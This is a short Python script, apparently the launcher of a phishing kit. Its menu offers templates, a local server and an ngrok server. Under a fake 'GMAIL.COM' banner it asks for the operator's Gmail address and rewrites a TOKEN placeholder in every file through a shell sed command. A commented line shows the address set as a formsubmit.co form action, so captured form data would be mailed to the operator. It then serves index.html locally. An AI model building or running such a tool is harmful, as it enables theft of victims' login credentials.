import os
import time
from colorama import Fore, Style, init
init()
cv = Fore.GREEN
ca = Fore.BLUE
cr = Fore.RED
cb = Fore.WHITE

os.system("clear")
def menu():
    print(f"""
          {cv}[0]{ca}Salir
          {cv}[1]{ca}Plantillas
          {cv}[2]{ca}Server Local
          {cv}[3]{ca}Server Ngrok
          {cv}[4]{ca}Reset Token
          {cv}[5]{ca}Tutorials\n""")

    select = input(f"{cb}Select{cv}/ ")

    if select == "2":


        def localhost():
            os.system("clear")
            print(f"""               {cr}𝔾𝕄𝔸𝕀𝕃{cb}.{ca}ℂ𝕆𝕄\n              """)
#𝔾𝕄𝔸𝕀𝕃. ℂ𝕆𝕄
            mail = str(input(f"""{cv}Enter your{cr} Gmail
                {cv}=>{cb} """))
#combo = f'action="https://formsubmit.co/{mail}"'
            os.system(f"find . -type f -print0 | xargs -0 sed -i 's/TOKEN/{mail}/g'")

            port = input(f"""        {cv}Enter{ca} Port
                {cr}example{ca} 8080{cv} =>{cb} """)
            time.sleep(2.5)
            print(f"""                {cb}Creando{ca} Server           """)
            os.system("termux-open-url http://[::]:8080/index.html")
            os.system("python -m http.server 8080")
        localhost()

    if select == "0":
        print("saliendo")
        time.sleep(2.5)
        os.system("clear")
        exit("")
menu()
